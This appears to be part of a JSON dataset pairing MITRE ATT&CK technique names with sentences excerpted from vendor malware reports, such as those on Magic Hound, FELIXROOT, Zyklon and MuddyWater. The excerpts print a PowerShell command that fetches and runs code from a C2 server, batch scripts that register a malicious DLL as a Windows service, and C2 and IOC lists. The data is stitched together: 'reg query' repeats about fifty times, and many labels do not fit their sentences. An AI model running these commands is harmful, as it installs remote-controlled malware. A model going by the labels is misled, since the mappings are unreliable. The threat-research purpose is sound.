b2ea3fcd2bc493a5ac86e47029b076716ed22ef4487f9090f4aa1923a48015d6 3f23972a0e80983351bedf6ad45ac8cd63669d3f1c76f8834c129a9e0418fff1 \u00a0 MagicHound.Retriever C2 service.chrome-up[.]date msservice[.]site microsoftexplorerservices[.]cloud \u00a0 MagicHound.Leash SHA256 133959be8313a372f7a8d95762722a6ca02bc30aaffde0cbcf6ba402426d02f5 ba3560d3c789984ca29d80f0a2ea38a224e776087e0f28104569630f870adaf4 d8731a94d17e0740184910ec81ba703bad5ff7afc92ba056f200533f668e07bf \u00a0 MagicHound.Leash C2 45.56.123[.]129 syn.timezone[.]live \u00a0 MPKBot SHA256 d08d737fa59edbea4568100cf83cff7bf930087aaa640f1b4edf48eea4e07b19 \u00a0 MPKBot C2 45.58.37[.]142 Appendix MAGICHOUND.ROLLOVER The Magic Hound campaign used Word and Excel documents as a delivery method, specifically documents that contain a malicious macro that attempts to load either the Pupy RAT or possibly Meterpreter"
    ]
  },
  "standard application layer protocol fallback channels powershell-multi": {
    "technique_names": [
      "application layer protocol",
      "fallback channels",
      "event triggered execution: powershell profile"
    ],
    "sentances": [
      "The macro carries out this first technique by running the following command:powershell.exe -w hidden -noni -nop -c \"iex(New-Object System.Net.WebClient).DownloadString('hxxp://139.59.46.154:3485/eiloShaegae1')\"The code above generates the following HTTP request, which the C2 server would then respond to with a script that PowerShell would execute: GET /eiloShaegae1 HTTP/1.1 Host: 139.59.46[.]154:3485 Connection: Keep-Alive The second method involves using PowerShell to create a thread to execute a buffer of shellcode, which we believe the threat actors obtained from the Magic Unicorn source code"
    ]
  },
  "deobfuscate/decode files or information remote file copy-multi": {
    "technique_names": [
      "deobfuscate/decode files or information",
      "ingress tool transfer"
    ],
    "sentances": [
      "After we decrypted the additional shellcode, we determined that the functional shellcode is part of the Metasploit Framework, specifically using the block_api.asm code to resolve API function names and the block_reverse_http.asm code to obtain additional shellcode to execute on the system"
    ]
  },
  "registry run keys / startup folder hidden files and directories-multi": {
    "technique_names": [
      "boot or logon autostart execution: registry run keys / startup folder",
      "hide artifacts: hidden files and directories"
    ],
    "sentances": [
      "To set up persistence, the loader creates a folder named \u201cc:\\temp\u201d, sets its attributes to be a hidden and system folder to hide the folder from view in Windows Explorer"
    ]
  },
  "system network configuration discovery web service fallback channels-multi": {
    "technique_names": [
      "system network configuration discovery",
      "web service",
      "fallback channels"
    ],
    "sentances": [
      "We have gathered three samples of the default loader associated with this group and extracted the following configurations:    SHA256 of Sample Configuration   82779504d3fa0ffc8506ab69de9cb4d8f6415adbb11a9b8312828c539cf10190 LAUNCHER_ARGS=[\u2018\u2013host\u2019, \u2018www1.chrome-up[.]date:4443\u2019, \u2018-t\u2019, \u2018obfs3\u2019]   db453b8de1a01a3e4d963847c0a0a45fb7e1a9b9e6d291c8883c74019f2fc91f LAUNCHER_ARGS=[\u2018\u2013host\u2019, \u2018www1.chrome-up[.]date:4443\u2019, \u2018-t\u2019, \u2018obfs3\u2019]   7e57e35f8fce0efc3b944a7545736fa419e9888514fcd9e098c883b8d85e7e73 LAUNCHER_ARGS=[\u2018\u2013host\u2019, \u2018139.59.46[.]154:3543\u2019, \u2018-t\u2019, \u2018obfs3\u2019]    \u00a0 These configurations show that this group uses both fully-qualified domain names and IP addresses to host their Pupy C2 servers"
    ]
  },
  "execution through api application window discovery-multi": {
    "technique_names": ["native api", "application window discovery"],
    "sentances": [
      "The following commands are available:    Command  SubCommand Description   VER  Generates the following IRC client command that will be sent to the C2 server: \u00a0 PRIVMSG <username> :\u00a0\u00a0\u00a0 8 LED= 20160124   KILL  Trojan disconnects from the IRC server and terminates itself   RESET  Trojan disconnects from the IRC server and runs the executable again   OS  Obtains the Windows version and responds to the C2 with the following message \u201cPRIVMSG <username> :<one of the following version strings>\u201d: \u00a0 Windows NT Windows 95 Windows 98 Windows ME Windows 2003 Windows XP Windows 7 Windows Vista Unkown os info   !SH EXEC Not supported    MD Creates a specified directory",
      "Embed \"scriptlets\" in generated payloads to perform some tasks \"offline\" without needing network connectivity (ex: start keylogger, add persistence, execute custom python script, check_vm, etc.)   Multiple Target Platforms:      Platform Support Status     Windows XP Supported   Windows 7 Supported   Windows 8 Supported   Windows 10 Supported   Linux Supported   Mac OSX Limited Support   Android Limited Support    Documentation All documentation can be found on the wiki"
    ]
  },
  "system owner/user discovery system owner/user discovery system owner/user discovery system owner/user discovery-multi": {
    "technique_names": ["system owner/user discovery"],
    "sentances": [
      "The Trojan will respond to the C2 with \u201cPRIVMSG <username> : <message> [<specified path>]\u201d"
    ]
  },
  "system owner/user discovery system information discovery-multi": {
    "technique_names": [
      "system owner/user discovery",
      "system information discovery"
    ],
    "sentances": [
      "SA  Generates the following IRC client command that will be sent to the C2 server: PRIVMSG <username> : Hello ,my name is\u00a0 <IRC USER name>, Im ready my Computer Name is:<computer name>  \u00a0 All of the commands, except for the VER command, must be issued by individuals in the IRC channel with nicknames that start with \u201cAS_\u201d or \u201cAF_\u201d",
      "!Hello The Trojan introduces itself by sending the current username, if its an admin account or not, the computer name, the system UUID and the OS version"
    ]
  },
  "process discovery remote file copy-multi": {
    "technique_names": ["process discovery", "ingress tool transfer"],
    "sentances": [
      "!ProcessList List running processes, including their PID, parent PID, executable name and priority   !SendFileToServer Uploads a specified file to the C2 server   !CaptureScreen Takes a screenshot that it saves to a file and uploads to the C2 server"
    ]
  },
  "process injection bypass user account control-multi": {
    "technique_names": [
      "process injection",
      "abuse elevation control mechanism: bypass user account control"
    ],
    "sentances": [
      "UAC bypass via DLL hijacking requires:  A Windows executable with the auto-elevate property in its manifest A Windows executable in a secure directory (%systemroot%\\system32)  The malicious NTWDBLIB DLL performs the simple task of setting up the malicious ipnet.dll as a service by running one of the two batch files contained in the CAB file (which is also dropped to %systemroot%\\system32):  NTWDBLIB executing the installer batch files under the context of cliconfg.exe.\u00a0 The batch files involved in the attack modify the system service COMSysApp to load the malicious ipnet.dll"
    ]
  },
  "process injection modify registry scripting service execution-multi": {
    "technique_names": [
      "process injection",
      "modify registry",
      "command and scripting interpreter",
      "system services: service execution"
    ],
    "sentances": [
      "The contents of the batch files vary depending on the OS (x64 vs x86): install1.bat (x64) @echo off sc stop COMSysApp sc config COMSysApp type= own start= auto error= normal binpath= \"%windir%\\SysWOW64\\svchost.exe -k COMSysApp\" reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost\" /v COMSysApp /t REG_MULTI_SZ /d \"COMSysApp\" /f reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\COMSysApp\\Parameters\" /v ServiceDll /t REG_EXPAND_SZ /d \"%windir%\\SysWOW64\\ipnet.dll\" /f sc start COMSysApp del /f /q %windir%\\SysWOW64\\install2.bat del /f /q %windir%\\SysWOW64\\install1.bat install2.bat (x86) @echo off sc stop COMSysApp sc config COMSysApp type= own start= auto error= normal binpath= \"%windir%\\System32\\svchost.exe -k COMSysApp\" reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost\" /v COMSysApp /t REG_MULTI_SZ /d \"COMSysApp\" /f reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\COMSysApp\\Parameters\" /v ServiceDll /t REG_EXPAND_SZ /d \"%windir%\\system32\\ipnet.dll\" /f sc start COMSysApp del /f /q %windir%\\System32\\install1.bat del /f /q %windir%\\System32\\install2.bat The batch files perform these tasks:  Stop the service COMSysApp Configure the service to autostart (to set up persistence on the system) Modify registry keys to launch the DLL unser svchost.exe Specify the malicious DLL path to be loaded into the svchost process"
    ]
  },
  "system information discovery data staged process discovery data encrypted-multi": {
    "technique_names": [
      "system information discovery",
      "data staged",
      "process discovery",
      "data encrypted for impact"
    ],
    "sentances": [
      "System info:  Computer name System info using: cmd /c systeminfo >%temp%\\temp.ini List of currently running process using: cmd /c tasklist >%temp%\\temp.ini    Exfiltration  The data exfiltration process runs in the following sequence: The temp.ini files are copied into a text file that matches the pattern:  From <COMPUTER-NAME> (<Month>-<Day> <Hour>-<Minute>-<Second>).txt"
    ]
  },
  "command-line interface data compressed data encoding-multi": {
    "technique_names": [
      "command and scripting interpreter",
      "archive collected data",
      "data encoding"
    ],
    "sentances": [
      "For example, From <COMPUTER-NAME> (01-04 11-40-02).txt  All the text files are now packed into the archive temp.zip (%temp%\\temp.zip) zip is Base64 encoded (with a custom key, same as that used in the malicious document) and then copied to post.txt txt is uploaded to the control server  Additional Commands and Capabilities The service-based DLL implant traverses to the /htdocs/ directory on the FTP server and looks for any files with the keywords:  TO EVERYONE: Commands issued to all infected endpoints TO <COMPUTERNAME>: Commands issued to endpoints matching the ComputerName  The following commands are supported by the malware implant:  cmd /c pull <filename>: Adds filename to temp.zip, Base64 encodes, and uploads to control server cmd /c chip <string>: Deletes current ipnet.ini config file"
    ]
  },
  "deobfuscate/decode files or information binary padding-multi": {
    "technique_names": [
      "deobfuscate/decode files or information",
      "obfuscated files or information: binary padding"
    ],
    "sentances": [
      "Based on the McAfee Advanced Threat Research team\u2019s analysis, we find multiple components from this operation are unique from a code perspective, even though the code is loosely based on previous versions of the SYSCON backdoor",
      "The string \u201cfjzmpcjvqp\u201d is unique and not something likely to be present if the code was not generated with the same public POC exploit code"
    ]
  },
  "exfiltration over alternative protocol": [
    "Indicators of compromise MITRE ATT&CK techniques  Modify existing service Code signing File deletion Deobfuscate/decode files or information System information discovery Process discovery Service execution RunDLL32 Scripting Command-line Interface Data from local system Automated exfiltration Data encrypted Commonly used port Bypass user account control  Hashes  fe32d29fa16b1b71cd27b23a78ee9f6b7791bff3 f684e15dd2e84bac49ea9b89f9b2646dc32a2477 1d280a77595a2d2bbd36b9b5d958f99be20f8e06 19d9573f0b2c2100accd562cc82d57adb12a57ec f90a2155ac492c3c2d5e1d83e384e1a734e59cc0 9b832dda912cce6b23da8abf3881fcf4d2b7ce09 f3b62fea38cb44e15984d941445d24e6b309bc7b 66d2cea01b46c3353f4339a986a97b24ed89ee18 7113aaab61cacb6086c5531a453adf82ca7e7d03 d41daba0ebfa55d0c769ccfc03dbf6a5221e006a 25f4819e7948086d46df8de2eeeaa2b9ec6eca8c 35ab747c15c20da29a14e8b46c07c0448cef4999 e87de3747d7c12c1eea9e73d3c2fb085b5ae8b42 0e4a7c0242b98723dc2b8cce1fbf1a43dd025cf0 bca861a46d60831a3101c50f80a6d626fa99bf16 01530adb3f947fabebae5d9c04fb69f9000c3cef 4229896d61a5ad57ed5c247228606ce62c7032d0 4c7e975f95ebc47423923b855a7530af52977f57 5a6ad7a1c566204a92dd269312d1156d51e61dc4 1dc50bfcab2bc80587ac900c03e23afcbe243f64 003e21b02be3248ff72cc2bfcd05bb161b6a2356 9b7c3c48bcef6330e3086de592b3223eb198744a 85e2453b37602429596c9681a8c58a5c6faf8d0c  Domains  ftp.byethost31.com ftp.byethost11.com 1113427185.ifastnet.org navermail.byethost3.com nihon.byethost3.com",
    "Figure 15: Structure used to send data to server    Figure 16: Structure used to send data to C2 server The structure is converted to Base64 using the CryptBinaryToStringA function",
    "It then uses WebDAV to upload to a Box cloud drive.",
    "Adversaries may steal data by exfiltrating it over a different protocol than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.  \n\nAlternate protocols include FTP, SMTP, HTTP/S, DNS, SMB, or any other network protocol not being used as the main command and control channel. Different protocol channels could also include Web services such as cloud storage. Adversaries may also opt to encrypt and/or obfuscate these alternate channels. \n\n[Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048) can be done using various common operating system utilities such as [Net](https://attack.mitre.org/software/S0039)/SMB or FTP.(Citation: Palo Alto OilRig Oct 2016) On macOS and Linux <code>curl</code> may be used to invoke protocols such as HTTP/S or FTP/S to exfiltrate data from a system.(Citation: 20 macOS Common Tools and Techniques) "
  ],
  "windows management instrumentation modify registry query registry-multi": {
    "technique_names": [
      "windows management instrumentation",
      "modify registry",
      "query registry"
    ],
    "sentances": [
      "WMI Namespaces    Win32_OperatingSystem    Win32_ComputerSystem    AntiSpywareProduct    AntiVirusProduct    FirewallProduct    Win32_UserAccount    Win32_NetworkAdapter    Win32_Process    Table 1: Referred classes WMI Queries and Registry Keys Used  SELECT Caption FROM Win32_TimeZone SELECT CSNAME, Caption, CSDVersion, Locale, RegisteredUser FROM Win32_OperatingSystem SELECT Manufacturer, Model, SystemType, DomainRole, Domain, UserName FROM Win32_ComputerSystem  Registry entries are read for potential administration escalation and proxy information"
    ]
  },
  "query registry": [
    "reg query",
    "reg query",
    "reg query",
    "reg query",
    "reg query",
    "reg query",
    "reg query",
    "reg query",
    "reg query",
    "reg query",
    "reg query",
    "reg query",
    "reg query",
    "reg query",
    "reg query",
    "reg query",
    "reg query",
    "reg query",
    "reg query",
    "reg query",
    "reg query",
    "reg query",
    "reg query",
    "reg query",
    "reg query",
    "reg query",
    "reg query",
    "reg query",
    "reg query",
    "reg query",
    "reg query",
    "reg query",
    "reg query",
    "reg query",
    "reg query",
    "reg query",
    "reg query",
    "reg query",
    "reg query",
    "reg query",
    "reg query",
    "reg query",
    "reg query",
    "reg query",
    "reg query",
    "reg query",
    "reg query",
    "reg query",
    "reg query",
    "reg query",
    "Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.\n\nThe Registry contains a significant amount of information about the operating system, configuration, software, and security.(Citation: Wikipedia Windows Registry) Information can easily be queried using the [Reg](https://attack.mitre.org/software/S0075) utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from [Query Registry](https://attack.mitre.org/techniques/T1012) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions."
  ],
  "connection proxy query registry-multi": {
    "technique_names": ["proxy", "query registry"],
    "sentances": [
      "Registry key \u201cSoftware\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\\u201d is queried to gather proxy information with values ProxyEnable, Proxy: (NO), Proxy, ProxyServer"
    ]
  },
  "file deletion shortcut modification-multi": {
    "technique_names": [
      "indicator removal on host: file deletion",
      "boot or logon autostart execution: shortcut modification"
    ],
    "sentances": [
      "Once all the tasks have been executed completely, the malware breaks the loop, sends the termination buffer back, and clears all the footprints from the targeted machine:  Deletes the LNK file from the startup directory"
    ]
  },
  "file deletion modify registry-multi": {
    "technique_names": [
      "indicator removal on host: file deletion",
      "modify registry"
    ],
    "sentances": [
      "Deletes the registry key HKCU\\Software\\Classes\\Applications\\rundll32.exe\\shell\\open Deletes the dropper components from the system",
      "However, if you DO get infected, you\u2019ll want to delete the following registry keys (if they exist): HKLM/System/CurrentControlSet/Services/DirecastX ytasda jrqq HKLM/System/CurrentControlSet/Services/DirectX yta jsdrq HKLM/System/CurrentControlSet/Services/DirectX ytsda jrq Additionally, you\u2019ll want to delete any copies of \u201csvchost.exe\u201d that you find in %Program Files (x86)%/DIFXE/, as these are the dropped copies of the malware"
    ]
  },
  "system service discovery account discovery remote system discovery windows admin shares-multi": {
    "technique_names": [
      "system service discovery",
      "account discovery",
      "remote system discovery",
      "remote services: smb/windows admin shares"
    ],
    "sentances": [
      "Appendix Indicators of Compromise    11227ECA89CC053FB189FAC3EBF27497  Seminar.rtf    4DE5ADB865B5198B4F2593AD436FCEFF  Seminar.rtf    78734CD268E5C9AB4184E1BBE21A6EB9  Zam<RandomNumber>.doc    92F63B1227A6B37335495F9BCB939EA2  FELIXROOT Dropper    DE10A32129650849CEAF4009E660F72F  FELIXROOT Backdoor    Table 4: FELIXROOT IOCs  Network Indicators of Compromise 217.12.204.100/news 217.12.204.100:443/news 193.23.181.151/Seminar.rtf Accept-Encoding: gzip, deflate content-Type: application/x-www-form-urlencoded Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.2) Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.2) Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.2) Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.2) Configuration Files  Version 1: {\"1\" : \"https://88.198.13.116:8443/xmlservice\",\"2\" : \"30\",\"4\" : \"GufseGHbc\",\"6\" : \"3\", \"7\" : \u201chttp://88.198.13.116:8080/xmlservice\"}  Version 2: {\"1\" : \"https://217.12.204.100/news/\",\"2\" : \"30\",\"4\" : \"KdfrJKN\",\"6\" : \"3\", \"7\" : \"http://217.12.204.100/news/\"} FireEye Detections    MD5  Product  Signature  Action    11227ECA89CC053FB189FAC3EBF27497  NX/EX/AX  Malware.Binary.rtf  Block    4DE5ADB865B5198B4F2593AD436FCEFF  NX/EX/AX  Malware.Binary.rtf  Block    78734CD268E5C9AB4184E1BBE21A6EB9  NX/EX/AX  Malware.Binary  Block    92F63B1227A6B37335495F9BCB939EA2  NX/EX/AX  FE_Dropper_Win32_FELIXROOT_1  Block    DE10A32129650849CEAF4009E660F72F  NX/EX/AX  FE_Backdoor_Win32_FELIXROOT_2  Block    11227ECA89CC053FB189FAC3EBF27497  HX  IOC  Alert    4DE5ADB865B5198B4F2593AD436FCEFF  HX  IOC  Alert    Table 5: FireEye Detections Acknowledgements Special thanks to Jonell Baltazar, Alex Berry and Benjamin Read for their contributions to this blog."
    ]
  },
  "masquerading obfuscated files or information-multi": {
    "technique_names": ["masquerading", "obfuscated files or information"],
    "sentances": [
      "Figure 11: XML configuration file to schedule the task The Zyklon malware first retrieves the external IP address of the infected machine using the following:  api.ipify[.]org ip.anysrc[.]net myexternalip[.]com whatsmyip[.]com  The Zyklon executable contains another encrypted file in its .Net resource section named tor"
    ]
  },
  "connection proxy command-line interface-multi": {
    "technique_names": ["proxy", "command and scripting interpreter"],
    "sentances": [
      "Command  Action    sign  Requests system information    settings  Requests settings from C2 server    logs  Uploads harvested passwords    wallet  Uploads harvested cryptocurrency wallet data    proxy  Indicates SOCKS proxy port opened    miner  Cryptocurrency miner commands    error  Reports errors to C2 server    ddos  DDoS attack commands    Table 1: Zyklon accepted commands The following figures show the initial request and subsequent server response for the \u201csettings\u201d (Figure 13), \u201csign\u201d (Figure 14), and \u201cddos\u201d (Figure 15) commands"
    ]
  },
  "system network configuration discovery remote file copy-multi": {
    "technique_names": [
      "system network configuration discovery",
      "ingress tool transfer"
    ],
    "sentances": [
      "Figure 13: Zyklon issuing \u201csettings\u201d command and subsequent server response    Figure 14: Zyklon issuing \u201csign\u201d command and subsequent server response    Figure 15: Zyklon issuing \u201cddos\u201d command and subsequent server response Plugin Manager Zyklon downloads number of plugins from its C2 server"
    ]
  },
  "software packing exploitation for privilege escalation-multi": {
    "technique_names": [
      "obfuscated files or information: software packing",
      "exploitation for privilege escalation"
    ],
    "sentances": [
      "The plugin URL is stored in file in following format:  /plugin/index.php?plugin=<Plugin_Name>  The following plugins are found in the memory of the Zyklon malware:  /plugin/index.php?plugin=cuda /plugin/index.php?plugin=minerd /plugin/index.php?plugin=sgminer /plugin/index.php?plugin=socks /plugin/index.php?plugin=tor /plugin/index.php?plugin=games /plugin/index.php?plugin=software /plugin/index.php?plugin=ftp /plugin/index.php?plugin=email /plugin/index.php?plugin=browser  The downloaded plugins are injected into: Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegAsm.exe"
    ]
  },
  "system network configuration discovery connection proxy-multi": {
    "technique_names": ["system network configuration discovery", "proxy"],
    "sentances": [
      "Socks5 Proxy Zyklon features the ability to establish a reverse Socks5 proxy server on infected host machines"
    ]
  },
  "clipboard data system network configuration discovery-multi": {
    "technique_names": [
      "clipboard data",
      "system network configuration discovery"
    ],
    "sentances": [
      "Hijack Clipboard Bitcoin Address Zyklon has the ability to hijack the clipboard, and replaces the user\u2019s copied bitcoin address with an address served up by the actor\u2019s control server"
    ]
  },
  "security software discovery virtualization/sandbox evasion powershell-multi": {
    "technique_names": [
      "software discovery: security software discovery",
      "event triggered execution: powershell profile",
      "virtualization/sandbox evasion: system checks"
    ],
    "sentances": [
      "Detection Name  Product  Action    POWERSHELL DOWNLOADER D (METHODOLOGY)  HX  Detect    SUSPICIOUS POWERSHELL USAGE (METHODOLOGY)  HX  Detect    POWERSHELL DOWNLOADER (METHODOLOGY)  HX  Detect    SUSPICIOUS EQNEDT USAGE (METHODOLOGY)  HX  Detect    TOR (TUNNELER)  HX  Detect    SUSPICIOUS SVCHOST.EXE (METHODOLOGY)  HX  Detect    Malware.Binary.rtf  EX/ETP/NX  Block    Malware.Binary  EX/ETP/NX  Block    FE_Exploit_RTF_CVE_2017_8759  EX/ETP/NX  Block    FE_Exploit_RTF_CVE201711882_1  EX/ETP/NX  Block    Table 2: Current detection capabilities by FireEye products Indicators of Compromise The contained analysis is based on the representative sample lures shown in Table 3"
    ]
  },
  "deobfuscate/decode files or information system network configuration discovery-multi": {
    "technique_names": [
      "deobfuscate/decode files or information",
      "system network configuration discovery"
    ],
    "sentances": [
      "Decrypted Config: C&C IP: 192.168.0.107 Port: 80 Sleep Timer: 30000 Campaign Identifier: Mirage If you look at it the decrypted configuration, you may notice that the IP being used for the C&C is an internal IP address"
    ]
  },
  "spearphishing attachment account discovery user execution-multi": {
    "technique_names": [
      "phishing: spearphishing attachment",
      "account discovery",
      "user execution"
    ],
    "sentances": [
      "This indicates that the attackers stole and modified a legitimate document from the compromised user account, crafted a malicious decoy Word macro document using this stolen document and sent it to the target recipient who might be expecting the email from the original account user before the real sender had time to send it"
    ]
  },
  "spearphishing link deobfuscate/decode files or information file deletion spearphishing attachment user execution fallback channels-multi": {
    "technique_names": [
      "phishing: spearphishing link",
      "deobfuscate/decode files or information",
      "indicator removal on host: file deletion",
      "phishing: spearphishing attachment",
      "user execution",
      "fallback channels"
    ],
    "sentances": [
      "AutoFocus customers can monitor ongoing activity from the threats discussed in this report by looking at the following tags:  MuddyWater PowerStats LazaGne DNSMessenger FIN7   Appendix A \u2013 C2 Addresses 148.251.204[.]131 144.76.109[.]88 138.201.75[.]227  Compromised Legitimate Sites 106[.]187[.]38[.]21 arbiogaz[.]com azmwn[.]suliparwarda[.]com bangortalk[.]org[.]uk best2[.]thebestconference[.]org camco[.]com[.]pk cbpexbrasilia[.]com[.]br cgss[.]com[.]pk diplomat[.]com[.]sa feribschat[.]eu ghanaconsulate[.]com[.]pk magical-energy[.]com mainandstrand[.]com riyadhfoods[.]com school[.]suliparwarda[.]com suliparwarda[.]com tmclub[.]eu watyanagr[.]nfe[.]go[.]th whiver[.]in www[.]4seasonrentacar[.]com www[.]akhtaredanesh[.]com www[.]arcadecreative[.]com www[.]armaholic[.]com www[.]asan-max[.]com www[.]autotrans[.]hr www[.]dafc[.]co[.]uk www[.]eapa[.]org www[.]elev8tor[.]com www[.]jdarchs[.]com www[.]kunkrooann[.]com www[.]mackellarscreenworks[.]com www[.]mitegen[.]com www[.]nigelwhitfield[.]com www[.]pomegranates[.]org www[.]ridefox[.]com www[.]shapingtomorrowsworld[.]org www[.]vanessajackson[.]co[.]uk www[.]yaran[.]co www[.]ztm[.]waw[.]pl coa[.]inducks[.]org mhtevents[.]com skepticalscience[.]com wallpapercase[.]com www[.]spearhead-training[.]com  Appendix B \u2013 Related files    sha256 Overall Description   d2a0eec18d755d456a34865ff2ffc14e3969ea77f7235ef5dfc3928972d7960f Loader script from 144.76.109[.]88   1421a5cd0566f4a69e7ca9cdefa380507144d7ed59cd22e53bfd25263c201a6f MuddyWater Macro   4e3c7defd6f3061b0303e687a4b5b3cc2a4ae84cdc48706c65a7b1e53402efc0 MuddyWater Macro   8b96804d861ea690fcb61224ec27b84476cf3117222cca05e6eba955d9395deb Lazagne   16985600c959f6267476da614243a585b1b222213ec938351ef6a26560c992db PS2EXE PowerStats (GitHub)   cf87a2ac51503d645e827913dd69f3d80b66a58195e5a0044af23ea6ba46b823 PS2EXE PowerStats (GitHub)   3030d80cfe1ee6986657a2d9b76b626ea05e2c289dee05bd7b9553b10d14e4a1 Decoded PowerStats payload   99077dcb37395603db0f99823a190f50313dc4e9819462c7da29c4bc983f42fd Lazagne Runner Script   1b60b7f9b0faf25288f1057b154413921a6cb373dcee43e831b9263c5b3077ce MuddyWater Macro   2c8d18f03b6624fa38cae0141b91932ba9dc1221ec5cf7f841a2f7e31685e6a1 MuddyWater Macro   367021beedb3ad415c69c9a0e657dc3ed82b1b24a41a71537d889f5e2b7ca433 MuddyWater Macro   58282917a024ac252966650361ac4cbbbed48a0df7cab7b9a6329d4a04551c0d MuddyWater Macro   58898648a68f0639c06bedc8242ca48bc6ec56f11ed40d00aa5fdda4e5553482 MuddyWater Macro   81523e0199ae1dc9e87d2b952642785bfbda6326f22e4c0794a19afdf001a9a3 MuddyWater Macro   90b66b3fef77962fbfda364a4f8799bfcc9ab73772026d7a8922a7cf5556a024 MuddyWater Macro   96101de2386e35bc5e38d32524a02c6c5ca7cc6624e656a629b2e0f1693a76fd MuddyWater Macro   964aaf5d9b1c749df0a2df1f1b4193e5a643893f251e2d74b47663f895da9b13 MuddyWater Macro   97f9a83bc6bb1b3f5cb7ac9401f95265597bff796bb4901631d6fa2c79a48bdc MuddyWater Macro   a3c1fd46177a078c4b95c744a24103df7d0a58cee1a3be92bc4cdd7dec1b1aa5 MuddyWater Macro   fcfbdffbcad731e0a5aad349215c87ed919865d66c287a6723fd8e2f896c5834 MuddyWater Macro   2bb1637c80f0a7df7260a8583beb033f4afbdd5c321ff5642bc8e1868194e009 MuddyWater Macro   58aec38e98aba66f9f01ca53442d160a2da7b137efbc940672982a4d8415a186 MuddyWater Macro   605fefc7829cfa41710e0b844084eab1f180fe513adc1d8f0f82501a154db0f4 MuddyWater Macro   e8a832b04dbdc413b71076754c3a0bf07cb7b9b61927248c482ddca32e1dab89 MuddyWater Macro   5d049bd7f478ea5d978b3c78f7f0afdf294a94f526fc20ffd6e33022d40d15ae MuddyWater Macro   12a7898fe5c75e0b57519f1e7019b5d09f5c5cbe49c48ab91daf6fcc09ee8a30 MuddyWater Macro   2602e817a67949860733b3548b37792616d52ffd305405ccab0409bcfedc5d63 MuddyWater Macro   42a4d9527063f73004b049a093a34a4fc3b6ea9505cb9b50b895486cb2dca94b MuddyWater Macro   5ed5fc6c6918ff6fa4eab7742c03d59155ca87e0fe12bac339f18928e2924a96 MuddyWater Macro   a2ad6bfc47c4f69a2170cc1a9fd620a68b1ebb474b7bdf601066e780e592222f MuddyWater Macro   c23ece07fc5432ca200f3de3e4c4b68430c6a22199d7fab11916a8c404fb63dc MuddyWater Macro   cb96cd26f36a3b1aacabfc79bbb5c1e0c9850b1c75c30aa498ad2d4131b02b98 MuddyWater Macro   ed2f9c9d5554d5248a7ad9ad1017af5f1bbadbd2275689a8b019a04c516eeec2 MuddyWater Macro   fe16543109f640ddbf3725e4d9f593de9f13ee9ae96c5e41e9cdccb7ab35b661 MuddyWater Macro   886e3a2f74bf8f46b23c78a6bad80c74fe33579f6fe866bc5075b034c4d5d432 MuddyWater Macro   8ec108b8f66567a8d84975728b2d5e6a2786c2ca368310cca55acad02bb00fa6 MuddyWater Macro   96d80ae577e9b899772a940b4941da39cf7399b5c852048f0d06926eb6c9868a MuddyWater Macro   bb1a5fb87d34c63ade0ed8a8b95412ba3795fd648a97836cb5117aff8ea08423 MuddyWater Macro   d65e2086aeab56a36896a56589e47773e9252747338c6b59c458155287363f28 MuddyWater Macro   588cd0fe3ae6fbd2fa4cf8de8db8ae2069ea62c9eaa6854caedf45045780661f MuddyWater Macro   917a6c816684f22934e2998f43633179e14dcc2e609c6931dd2fc36098c48028 MuddyWater Macro   db7bdd6c3ff7a27bd4aa9acc17dc35c38b527fb736a17d0927a0b3d7e94acb42 MuddyWater Macro   de6ce9b75f4523a5b235f90fa00027be5920c97a972ad6cb2311953446c81e1d MuddyWater Macro   a6673c6d52dd5361afd96f8143b88810812daa97004f69661da625aaaba9363b MuddyWater Macro   40a6b4c6746e37d0c5ecb801e7656c9941f4839f94d8f4cd61eaf2b812feaabe MuddyWater Macro     Appendix C \u2013 Proxy URLs found from POWERSTATS samples from October 2017 onwards hxxp://106[.]187[.]38[.]21/short_qr/work[.]php?c= hxxp://arbiogaz[.]com/upload/work[.]php?c= hxxp://azmwn[.]suliparwarda[.]com/wp-content/plugins/wpdatatables/panda[.]php?c= hxxp://azmwn[.]suliparwarda[.]com/wp-content/themes/twentyfifteen/logs[.]php?c= hxxp://bangortalk[.]org[.]uk/speakers[.]php?c= hxxp://best2[.]thebestconference[.]org/ccb/browse_cat[.]php?c= hxxp://camco[.]com[.]pk/Controls/data[.]aspx?c= hxxp://cbpexbrasilia[.]com[.]br/wp-content/plugins/wordpress-seo/power[.]php?c= hxxp://cbpexbrasilia[.]com[.]br/wp-includes/widgets/work[.]php?c= hxxp://cgss[.]com[.]pk/data[.]aspx?c= hxxp://diplomat[.]com[.]sa/wp-content/plugins/wordpress-importer/cache[.]php?c= hxxp://feribschat[.]eu/logs[.]php?c= hxxp://ghanaconsulate[.]com[.]pk/data[.]aspx?c= hxxp://magical-energy[.]com/css[.]aspx?c= hxxp://magical-energy[.]com/css/css[.]aspx?c= hxxp://mainandstrand[.]com/work[.]php?c= hxxp://riyadhfoods[.]com/css/edu[.]aspx?c= 